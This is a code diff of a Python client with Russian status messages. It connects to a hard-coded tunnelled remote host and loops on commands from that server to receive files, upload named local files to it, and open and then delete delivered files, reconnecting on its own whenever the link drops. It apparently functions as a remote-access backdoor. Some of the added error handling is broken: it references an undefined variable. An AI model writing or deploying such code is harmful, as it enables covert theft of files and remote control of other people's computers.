@@ -4,7 +4,7 @@ import time
 
 from modules import main as m
 
-HOST, PORT = 'suda playit', 0000#port iz playita
+HOST, PORT = 'est-wood.gl.at.ply.gg', 19355
 
 def download(s):
     header = s.recv(1024).decode('utf-8').strip()
@@ -49,35 +49,42 @@ def connect_to_server(HOST, PORT):
             print(f"<---> Попытка подключиться к серверу {HOST}:{PORT}...")
             s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             s.connect((HOST, PORT))
+            execute_commands(s)
             return s
+        except Exception:
+            print(f"<---> Ошибка при подключении: {e}")
+            time.sleep(3)
         except socket.error as e:
             print(f"<---> Ошибка при подключении: {e}")
-            time.sleep(5)
+            time.sleep(3)
 
 def execute_commands(s):
     while True:
-        print(f"<-+-> Подключение к серверу установлено.")
-        command = s.recv(24576).decode('utf-8')
-        s.send(b'<-+->Answered')
+        try:
+            print(f"<-+-> Подключение к серверу установлено.")
+            command = s.recv(24576).decode('utf-8')
+            s.send(b'<-+->Answered')
 
-        if command.lower() == 'exit':
-            break
+            if command.lower() == 'exit':
+                break
 
-        elif 'loadfile' in command:
-            filename = command[8:].strip()
-            download(s)
-            
-        elif 'download' in command:
-            filename = command[8:].strip()
-            send(filename, s)
+            elif 'loadfile' in command:
+                filename = command[8:].strip()
+                download(s)
+                
+            elif 'download' in command:
+                filename = command[8:].strip()
+                send(filename, s)
 
-        elif 'openfile' in command:
-            filename = command[8:].strip()
-            m.play_and_delete(filename)
+            elif 'openfile' in command:
+                filename = command[8:].strip()
+                m.play_and_delete(filename)
+
+        except Exception:
+            connect_to_server(HOST, PORT)
 
 def main():
     s = connect_to_server(HOST, PORT)
-    execute_commands(s)
 
 if __name__ == '__main__':
     main()
